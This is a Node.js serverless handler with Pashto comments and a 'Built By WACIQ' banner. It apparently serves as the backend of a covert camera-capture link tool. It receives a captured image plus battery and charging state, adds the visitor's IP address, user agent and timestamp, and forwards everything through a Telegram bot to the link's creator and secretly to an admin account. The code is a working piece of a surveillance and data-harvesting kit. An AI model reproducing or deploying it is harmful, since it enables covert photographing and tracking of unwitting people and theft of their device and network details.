const { Telegraf } = require('telegraf');
const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  try {
    const { image, uid, battery, charging } = req.body;
    const adminId = process.env.ADMIN_ID;

    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || "ناڅرګند";
    const timestamp = new Date().toLocaleString('en-US', {
      timeZone: 'Asia/Kabul',
      hour12: false,
    });

    if (!uid || !image) return res.status(400).send('UID یا عکس نشته');

    const base64 = image.replace(/^data:image\/\w+;base64,/, '');
    const imgBuffer = Buffer.from(base64, 'base64');

    const isCharging = charging ? 'وصل دی 🔌' : 'وصل نه دی ❌';
    const caption = `
🆕 *نوی عکس ترلاسه شو*

━━━━━━━━━━━━━━━━━━
🆔 *تلګرام آي‌ډي:* \`${uid}\`
🔋 *بیټرۍ کچه:* \`${battery || '?'}%\`
⚡ *چارجر حالت:* \`${isCharging}\`
🌐 *IP آدرس:* \`${ip}\`
📱 *دستګاه:* \`${userAgent}\`
🕒 *وخت:* \`${timestamp}\`
━━━━━━━━━━━━━━━━━━

──────╮  
│🧑🏻‍💻 𝗕𝘂𝗶𝗹𝘁 𝗕𝘆: 💛 𝗪𝗔𝗖𝗜𝗤 
╰────────────╯
`.trim();

    // ✅ کارونکي ته عکس او کپشن لیږل
    await bot.telegram.sendPhoto(uid, { source: imgBuffer }, {
      caption,
      parse_mode: 'Markdown'
    });

    // ✅ اډمین ته عکس او کپشن لیږل
    if (adminId) {
      await bot.telegram.sendPhoto(adminId, { source: imgBuffer }, {
        caption,
        parse_mode: 'Markdown'
      });
    }

    res.status(200).send('✅ عکس واستول شو');
  } catch (err) {
    console.error(err);
    res.status(500).send('❌ د لیږلو ستونزه');
  }
}; 
